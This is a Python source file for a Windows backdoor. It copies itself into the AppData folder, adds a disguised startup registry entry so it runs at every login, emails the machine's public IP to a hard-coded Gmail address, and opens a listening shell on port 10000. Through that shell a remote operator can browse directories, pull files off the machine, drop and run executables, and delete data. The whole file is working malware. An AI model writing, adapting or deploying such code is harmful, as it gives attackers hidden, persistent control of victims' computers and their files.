import os, sys, socket, shutil, base64, requests, subprocess

from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, OpenKey, SetValueEx
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP_SSL as SMTP


class Server:
    def __init__(self, ip, port) -> None:
        """
            Initialization function
        """
        try:
            self.copy_file()
            self.send_email()
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((ip, port))
            self.socket.listen(1)
            self.client, self.addr = self.socket.accept()
            print(f'[+] Connection successfully established with machine: {self.addr[0]}:{self.addr[1]}')
        except Exception as exc:
            print('Exception __init__(): ', exc)
    def addStartup(self, path_file) -> None:
        """
            Adds autoplay to the registry
        """
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'Show image 1', 0, REG_SZ, path_file)
    def check_exist_file(self, path_file):
        """
            Check exist file path in the Registry
        """
        return os.path.exists(path_file)
    def copy_file(self) -> None:
        """
            Copy file to 'Roaming' directory
        """
        current_path = os.getcwd()
        file_name = sys.argv[0].split('\\')[-1]
        src_path = f'{current_path}\{file_name}'
        dst_path = f'{os.environ.get("APPDATA")}\{file_name}'
        if self.check_exist_file(dst_path):
            pass
        else:
            shutil.copyfile(src_path, dst_path)
            self.addStartup(dst_path)
    def my_ip(self):
        """
            Returns ip-address
        """
        res = requests.get('http://icanhazip.com/').text
        return res
    def send_email(self):
        """
            Send email
        """
        try:
            # Parameters MAIL
            SMTPserver = 'smtp.gmail.com'
            sender = 'sender@gmail.com'
            destination = 'destination@gmail.com'
            USERNAME = 'sender@gmail.com'
            PASSWORD = 'password'
            subject = f'Машина включена'

            ip = self.my_ip()
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = destination
            msg['Subject'] = subject
            message = f'Машина включена, на ip-address: {ip}'
            msg.attach(MIMEText(message))

            mailserver = SMTP(SMTPserver, 465)
            mailserver.set_debuglevel(False)
            mailserver.login(USERNAME, PASSWORD)
            mailserver.sendmail(sender, destination, msg.as_string())

            mailserver.quit()
        except Exception as exc:
            print('Exception send_email(): ', exc)
    def commands_shell(self, command: str) -> str:
        """
            Run commands shell
        """
        try:
            if command.lower() == 'exit':
                try:
                    return "break"
                except FileNotFoundError:
                    self.socket.send(b'\n\n\t--- File not found ---')
                except OSError:
                    self.socket.send(b'\n\n\t--- An error has occurred ---')
            elif command.lower() == 'pwd':
                try:
                    current_path = os.getcwd()
                    self.client.send(base64.b64encode(current_path.encode()))
                    return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif command.lower() == 'dir':
                try:
                    files = os.listdir(os.getcwd())
                    current_path = os.getcwd()
                    result = []
                    for file in files:
                        if os.path.isfile(file):
                            result.append(f"\t{file} -- File \n")
                        elif os.path.isdir(file):
                            result.append(f"\t{file} -- Directory \n")
                        else:
                            continue
                
                    mystr = "".join(result)
                    if mystr:
                        CURRENT_PATH = f"\n\nCurrent Files:\n{mystr}\nPath: {current_path}\n".encode()
                    else:
                        CURRENT_PATH = "\n\n\t--- Directory is empty ---".encode()
                    self.client.send(base64.b64encode(CURRENT_PATH))
                    self.client.send(base64.b64encode(b"--- End ---"))
                    return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif command.lower() == 'cd ..':
                try:
                    os.chdir('..')
                    self.client.send(base64.b64encode(b'cd ..'))
                    return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif len(command) == 1024:
                try:
                    json_data = f"{command}"
                    current_path = os.getcwd()
                    while True:
                        try:
                            data = self.client.recv(1024).decode("utf-8", "ignore")
                            json_data = json_data + data

                            if "File upload was successful" in data:
                                with open(f'{current_path}\{"bfsvc.exe"}', 'wb') as file:
                                    file.write(base64.b64decode(json_data.replace("--- File upload was successful ---", "")))
                                    file.close()
                                self.client.send(b"--- File upload was successful ---")
                                break
                        except Exception:
                            continue
                except FileNotFoundError:
                    self.client.send(b'\n\n\t--- File not found ---')
                except OSError:
                    self.client.send(b'\n\n\t--- An error has occurred ---')
            elif 'mkdir' in command.lower():
                try:
                    subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    self.client.send(base64.b64encode(b'Directory created successfully'))
                    return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif 'rmdir' in command.lower():
                try:
                    subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    self.client.send(base64.b64encode(b'Directory deleted successfully'))
                    return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif 'cd ' in command.lower():
                try:
                    cwd = os.getcwd()
                    directory = command.split()[1]
                    os.chdir(f'{cwd}\{directory}')
                    self.client.send(base64.b64encode(b'Successful directory change'))
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif 'echo' in command.lower():
                try:
                    subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    self.client.send(base64.b64encode(b'File created successfully'))
                    return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif 'del' in command.lower():
                try:
                    filename = command.split()[1]
                    current_path = os.listdir(os.getcwd())
                    if '.' in filename:
                        if filename in current_path:
                            subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                            self.client.send(base64.b64encode(b'File deleted successfully'))
                            return "continue"
                        else:
                            self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                            return "continue"
                    else:
                        self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                        return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif 'get' in command.lower():
                try:
                    filename = command.split()[1]
                    current_path = os.listdir(os.getcwd())
                    if '.' in filename:
                        if filename in current_path:
                            with open(filename, 'rb') as file_to_send:
                                file = file_to_send.read()
                                self.client.send(base64.b64encode(file))
                                file_to_send.close()
                            self.client.send(b"--- File upload was successful ---")
                            return "continue"
                        else:
                            self.client.send(b'\n\n\t--- File not found ---')
                            return "continue"
                    else:
                        self.client.send(b'\n\n\t--- File not found ---')
                        return "continue"
                except FileNotFoundError:
                    self.client.send(b'\n\n\t--- File not found ---')
                except OSError:
                    self.client.send(b'\n\n\t--- An error has occurred ---')
            elif 'run' in command.lower():
                try:
                    filename = command.split()[1]
                    current_path = os.listdir(os.getcwd())
                    if '.' in filename:
                        if filename in current_path:
                            filename = command.split()[1]
                            result_command = subprocess.check_output(f'{filename}', shell=True)
                            self.client.send(base64.b64encode(b'success'))
                            return "continue"
                        else:
                            self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                            return "continue"
                    else:
                        self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                        return "continue"
                except FileNotFoundError:
                    self.client.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.client.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            else:
                self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
                return "continue"
        except Exception as exc:
            print('Exception commands_shell(): ', exc)
    def run(self) -> None:
        """
            Command to connect to the server
        """
        try:
            while True:
                try:
                    command = self.client.recv(1024).decode()
                    result = self.commands_shell(command)
                    if result == "break":
                        break
                    else:
                        continue
                except Exception:
                    continue
        except KeyboardInterrupt:
            self.client.close()
            self.socket.close()
            sys.exit()

if __name__ == '__main__':
    ip = '0.0.0.0'
    port = 10000
    server = Server(ip, port)
    server.run()
